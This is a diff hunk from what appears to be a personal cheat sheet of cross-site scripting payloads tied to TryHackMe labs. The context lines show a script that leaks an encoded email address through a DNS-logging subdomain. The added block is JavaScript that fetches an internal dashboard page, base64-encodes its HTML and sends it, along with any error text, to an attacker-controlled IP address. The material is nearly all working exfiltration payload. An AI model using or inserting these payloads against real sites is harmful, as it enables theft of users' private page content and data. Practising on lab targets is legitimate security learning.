@@ -50,6 +50,20 @@ email = email.replace(".", "0")
 document.location = "http://"+ email +".1f7d4a50dfb910819a8fba9df66e73ad.log.tryhackme.tech"</script>
 ```
 
+```js
+const ATTACKER_URL = "http://192.168.131.34:8000/?data=";
+fetch('http://localhost/dashboard.php')
+  .then(response => response.text())
+  .then(htmlContent => {
+    const encodedData = btoa(unescape(encodeURIComponent(htmlContent)));
+    fetch(ATTACKER_URL + encodedData);
+    // new Image().src = ATTACKER_URL + encodedData;
+  })
+  .catch(error => {
+    fetch(ATTACKER_URL + "Error: " + btoa(error.message));
+  });
+```
+
 ### iframe
 
 ```js
